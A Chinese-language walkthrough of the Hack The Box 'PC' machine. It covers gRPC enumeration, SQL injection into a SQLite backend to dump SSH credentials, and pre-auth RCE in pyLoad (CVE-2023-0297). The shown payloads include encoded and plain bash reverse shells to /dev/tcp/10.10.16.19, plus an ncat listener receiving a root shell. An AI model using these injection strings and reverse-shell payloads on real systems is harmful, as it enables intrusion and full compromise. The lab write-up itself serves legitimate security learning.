## Hack The Box Level PC

拿到机器后，先nmap扫一下端口。

```shell
nmap -p- --open 10.10.11.214
# -p- 代表全部端口 
# --open 只显示开放端口
```

```shell
┌──(root㉿kali)-[~]
└─# nmap -p- 10.10.11.214
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 22:49 CST
Stats: 0:07:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 59.83% done; ETC: 23:01 (0:05:02 remaining)
Nmap scan report for 10.10.11.214
Host is up (0.070s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown
```

发现只有两个端口开放,22和50051。

google查一下50051是什么服务。

看了一下是GRPC，之前没接触过，贴一下官网的简介：

---

**Why gRPC?**
gRPC is a modern open source high performance Remote Procedure Call (RPC) framework that can run in any environment. It can efficiently connect services in and across data centers with pluggable support for load balancing, tracing, health checking and authentication. It is also applicable in last mile of distributed computing to connect devices, mobile applications and browsers to backend services.

---

基于http但是没有ui界面（没有web页面），google 查一下 grpc client ui。

发现一个基于go语言的开源项目：https://github.com/fullstorydev/grpcui

```shell
git clone https://github.com/fullstorydev/grpcui.git
```

或者直接：

```shell
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
```

下载下来的grpcui会存放在$GOPATH路径下，但是这个环境变量需要我们自己提前设置好。

```shell
sudo vim ~/.bash_profile
#添加
export GOPATH=path/to/gopath
export PATH=$PATH:$GOPATH/bin
#应用更改
source ~/.bash_profile
#查看
echo $PATH
```

然后直接运行：

```shell
grpcui -plaintext 10.10.11.214:50051
```

会自动弹出web页面(切换到火狐，不要用Chrome)，用Chrome的话BP抓不到127.0.0.1的包。

访问about:config，修改**network.proxy.allow_hijacking_localhost**字段为true

![image-20230607154400633](/images/%3AUsers%3Afanhexuan%3ALibrary%3AApplication%20Support%3Atypora-user-images%3Aimage-20230607154400633.png)

![image-20230605230806611](/images/Hack%20The%20Box%20Level%20PC.png)

这里Method name 选择LoginUser，抓包。

```shell
POST /invoke/SimpleApp.LoginUser HTTP/1.1
Host: 127.0.0.1:58438
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
x-grpcui-csrf-token: PI5QUg4dSMhHsbNcDnDS30cFBVMRMClwBUwfFPoF7MU
X-Requested-With: XMLHttpRequest
Content-Length: 76
Origin: http://127.0.0.1:58438
Connection: close
Referer: http://127.0.0.1:58438/
Cookie: _grpcui_csrf_token=PI5QUg4dSMhHsbNcDnDS30cFBVMRMClwBUwfFPoF7MU
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"timeout_seconds":3,"metadata":[],"data":[{"username":"1","password":"1"}]}
```

爆破一下帐号密码（admin，admin）登陆成功。

- 这里Method name选择注册，然后用注册的账号密码登陆也可以。

收到id和token。

选择Method name 为getinfo，metadata填入回传的token，id写收到的值。

抓包，重放，响应如下：

```shell
HTTP/1.1 200 OK
Content-Type: application/json
Date: Wed, 07 Jun 2023 07:49:26 GMT
Content-Length: 401
Connection: close

{
  "headers": [
    {
      "name": "content-type",
      "value": "application/grpc"
    },
    {
      "name": "grpc-accept-encoding",
      "value": "identity, deflate, gzip"
    }
  ],
  "error": null,
  "responses": [
    {
      "message": {
        "message": "Will update soon."
      },
      "isError": false
    }
  ],
  "requests": {
    "total": 1,
    "sent": 1
  },
  "trailers": []
}
```

POST请求体为：

```shell
{"timeout_seconds":3,"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODYxMzQwNjN9.fvFtbaGpM-ATwO9SRW-XdTyor8rRk8i8buD8Vo2Er4A"}],"data":[{"id":"420"}]}
```

id处试一下sql注入，420 '，报错：

```shell
{
  "headers": [],
  "error": {
    "code": 2,
    "name": "Unknown",
    "message": "Unexpected \u003cclass 'TypeError'\u003e: bad argument type for built-in operation",
    "details": []
  },
  "responses": null,
  "requests": {
    "total": 1,
    "sent": 1
  },
  "trailers": [
    {
      "name": "content-type",
      "value": "application/grpc"
    }
  ]
}
```

可以用sqlmap跑或者手工注入。

```shell
python3 sqlmap.py -r ~/Desktop/pc -p id -f --batch -dump-all
```

手工：

```json
"id":"420 union select sqlite_version(); --+ "
#表名，数据库名
"id":"420 union select group_concat(sql) from sqlite_master --+ "
#username的值
"id":"420 union select group_concat(username) from accounts --+ "
#password
"id":"420 union select group_concat(password) from accounts --+ "
```

拿到帐号：sau，密码：HereIsYourPassWord1431

ssh登陆，拿到user flag。

```shell
sshpass -p HereIsYourPassWord1431 ssh sau@10.10.11.214
```

Linpeas.sh 跑一下

```shell
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::50051                :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

发现8000和9666两个端口nmap并没有扫到

```shell
ss -tnl
#和上面结果一样
```

Curl 一下

```shell
sau@pc:~/pc$ curl 127.0.0.1:8000
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F">/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F</a>. If not, click the link.
```

有web服务，ssh端口转发。

```shell
[2023- 6-07 16:56:59 CST] Fanxiaoyao tools/linpeas
🔍🤡 -> ssh -L 8888:127.0.0.1:8000 sau@10.10.11.214
sau@10.10.11.214's password:
```

现在宿主机也可以访问

```shell
[2023- 6-07 16:58:22 CST] Fanxiaoyao tools/linpeas
🔍🤡 -> curl 127.0.0.1:8888
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.0.0.1%3A8888%2F">/login?next=http%3A%2F%2F127.0.0.1%3A8888%2F</a>. If not, click the link.
```

是pyload，查一下CVE

![image-20230607170009272](/images/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230607170009272.png)

参考：https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad

抓包，构建payload。

```shell
POST /flash/addcrypted2 HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

jk=pyimport%20os;os.system("touch%20/tmp/sc");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
```

```shell
sau@pc:~/pc$ ls /tmp
f                 systemd-private-628a5522ee4648d296ffe1c8e6eca0de-ModemManager.service-ImOkhf
pwnd              systemd-private-628a5522ee4648d296ffe1c8e6eca0de-systemd-logind.service-BZwW7g
pwndd             systemd-private-628a5522ee4648d296ffe1c8e6eca0de-systemd-resolved.service-ncz9nh
pyLoad            tmpxrh_sme7
sc                tmux-1001
snap-private-tmp  vmware-root_737-4257003961
```

准备反向shell：

```shell
POST /flash/addcrypted2 HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

jk=pyimport%20os;os.system("%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%31%39%2f%39%39%39%39%20%30%3e%26%31%27%22);f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa

#or

POST /flash/addcrypted2 HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

jk=pyimport%20os;os.system("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.19/9999+0>%261'");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa

#bash -c 'bash -i >& /dev/tcp/10.10.11.15/9999 0>&1'
```

```shell
[2023- 6-07 16:58:24 CST] Fanxiaoyao tools/linpeas
🔍🤡 -> ncat -lvnp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.11.214.
Ncat: Connection from 10.10.11.214:42268.
bash: cannot set terminal process group (1051): Inappropriate ioctl for device
bash: no job control in this shell
root@pc:~/.pyload/data# whoami
whoami
root
root@pc:~/.pyload/data#
```

拿到system flag。
